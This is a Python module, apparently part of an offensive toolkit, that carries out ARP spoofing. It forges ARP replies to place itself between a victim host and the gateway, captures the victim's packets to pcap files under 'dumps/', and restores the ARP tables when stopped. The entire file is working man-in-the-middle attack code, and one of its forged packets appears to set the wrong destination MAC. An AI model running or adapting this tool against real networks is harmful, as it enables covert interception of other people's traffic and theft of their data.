from modules.network import get_mac
from multiprocessing import Process
from kamene.all import ARP, conf, send, sniff, wrpcap
from modules.print import print_color

import sys
import time
import os
import datetime

def get_unique_filename() -> str:
    '''
    Get the unique filename
    '''
    timestamp = datetime.datetime.now().strftime('%d%m%Y')
    counter = 1
    filename = f'dumps/arp-spoofing_{timestamp}.pcap'
    
    while os.path.exists(filename):
        filename = f'dumps/arp-spoofing_{timestamp}({counter}).pcap'
        counter += 1
        
    return filename

class Arp:
    def __init__(self, victim, gateway, interface, count=100, verbose=False) -> None:
        conf.iface = interface['name']
        conf.verbose = 0
        
        self.victim = victim
        self.victim_mac = get_mac(victim)
        if self.victim_mac is None:
            print_color('[!] Unable to get mac address of victim, quitting...', 'red')
            sys.exit(0)
            
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        if self.gateway_mac is None:
            print_color('[!] Unable to get mac address of gateway, quitting...', 'red')
            sys.exit(0)
            
        self.interface = interface['name']
        self.verbose = verbose
        self.count = count 
        self.filename = get_unique_filename()
        
        if self.verbose:
            print(f'Initialized {interface["name"]}:')
            print(f'Gateway ({gateway}) is at {self.gateway_mac}')
            print(f'Victim ({victim}) is at {self.victim_mac}')
            print('-'*30)  
    
    def run(self) -> None:
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self) -> None:
        '''
        ARP tables poisoning
        '''
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac
        
        if self.verbose:
            print(f'[i] ip src: {poison_victim.psrc}')
            print(f'[i] ip dst: {poison_victim.pdst}')
            print(f'[i] mac src: {poison_victim.hwsrc}')
            print(f'[i] mac dst: {poison_victim.hwdst}')
            print(poison_victim.summary())
            print('-'*30)
        
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.victim_mac
        
        if self.verbose:
            print(f'[i] ip src: {poison_gateway.psrc}')
            print(f'[i] ip dst: {poison_gateway.pdst}')
            print(f'[i] mac src: {poison_gateway.hwsrc}')
            print(f'[i] mac dst: {poison_gateway.hwdst}')
            print(poison_gateway.summary())
            print('-'*30)
        print_color(f'\n[*] Beginning the ARP poison. Press CTRL+C to stop', 'green')
        
        while True:
            try:
                send(poison_gateway)
                send(poison_victim)
                time.sleep(2)
                
            except KeyboardInterrupt:
                time.sleep(1)
                self.restore()
                print('\n[*] Quitting...')
                sys.exit(0)
            
    def sniff(self) -> None:
        '''
        Sniff packets from the victim
        '''
        log_directory = 'dumps'
        if not os.path.exists(log_directory):
            os.makedirs(log_directory)
            
        time.sleep(4)
        print(f'[i] Sniffing {self.count} packets')
        
        bpf_filter = f'ip host {self.victim}' 
        packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
        
        print_color(f'\n[*] Writing packets to file arp.pcap...', 'green')
        
        wrpcap(self.filename, packets)
        
        self.restore()
        self.poison_thread.terminate()
        
        print_color('[*] Finished', 'green')
    
    def restore(self) -> None:
        '''
        Restore all
        '''
        print_color('[*] Restoring target...', 'green')
        send(ARP(
            op=2,
            psrc=self.gateway,
            pdst=self.victim,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=self.gateway_mac),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            pdst=self.gateway,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=self.victim_mac),
            count=5)